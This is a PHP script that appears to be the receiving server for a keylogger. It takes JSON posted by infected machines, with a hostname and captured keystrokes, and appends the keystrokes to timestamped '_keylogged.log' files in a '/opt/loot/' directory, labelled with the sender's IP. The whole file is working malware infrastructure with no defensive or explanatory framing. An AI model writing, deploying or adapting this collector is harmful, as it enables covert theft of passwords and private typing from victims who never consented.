<?php

function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}



// For info re: JSON in PHP:
// http://php.net/manual/en/function.json-encode.php


$date = date('dmY_His', time());

$post_data_raw = file_get_contents('php://input');
$post_data = json_decode($post_data_raw, true);

$client = getUserIP() . "_" . basename($post_data['hostname']);

$file_handle = fopen('/opt/loot/' . $date . "_" . $client . '_keylogged.log', 'a');
fwrite($file_handle, $post_data['data']);
fwrite($file_handle, "\n");
fclose($file_handle);

?>
